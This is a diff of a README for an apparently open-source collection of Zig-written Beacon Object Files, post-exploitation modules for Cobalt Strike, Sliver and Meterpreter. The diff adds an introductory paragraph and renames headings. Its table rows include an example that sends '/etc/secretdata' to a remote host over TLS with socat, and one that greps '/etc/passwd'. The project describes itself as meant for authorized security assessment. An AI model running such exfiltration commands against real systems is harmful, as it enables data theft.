@@ -103,6 +103,8 @@ This is an open source project meant to be used with authorization to assess the
 
 # Z-Labs BOFs collection
 
+In addition to `bof-launcher` and `z-beac0n` projects, we maintain growing collection of our BOFs in this repository. Main differentiator of these BOFs is that they are implemented in `Zig` programming language. This, among other advantages like (modern language syntax, access to rich std library), brings the capability to implement truly cross-platform BOFs. Simultaneously, they are fully compatible with original `Cobalt Strike` BOFs and can be run in other tools as well. Specifically, [Sliver](https://github.com/BishopFox/sliver) and [Meterpreter](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-executebof-command.html) was [tested](bofs/socat).
+
 ## Cross-platform BOFs
 
 | BOF name  | Description | Supported platforms | Example
@@ -120,7 +122,7 @@ This is an open source project meant to be used with authorization to assess the
 | [grep](bofs/src/grep.zig) | Print lines that match patterns | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `grep root /etc/passwd` |
 | [find](bofs/src/find.zig) | Search for files in a directory hierarchy | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `find /dev -type b` |
 
-## Linux-only BOFs
+## Linux-specific BOFs
 
 | BOF name  | Description | Supported platforms | Example
 | ------------- | ---------------------------------------------------- | --------------------------- | ------------------ |
@@ -136,7 +138,7 @@ This is an open source project meant to be used with authorization to assess the
 | [ifconfig](bofs/src/net-tools/ifconfig.zig) | Display the status of the currently active network interfaces. With root privileges: also manipulate current state of the device | `Linux x86/x86_64/ARMv6+/AArch64` | `ifconfig eth0 promisc` |
 | [socat](bofs/socat/) | Arbitrary TCP and TLS connections | `Linux x86/x86_64/ARMv6+/AArch64` | `socat OPEN:/etc/secretdata TLS:remotehost:8443` |
 
-## Windows-only BOFs
+## Windows-specific BOFs
 
 | BOF name  | Description | Supported platforms | Example
 | ------------- | ---------------------------------------------------- | --------------------------- | ------------------ |
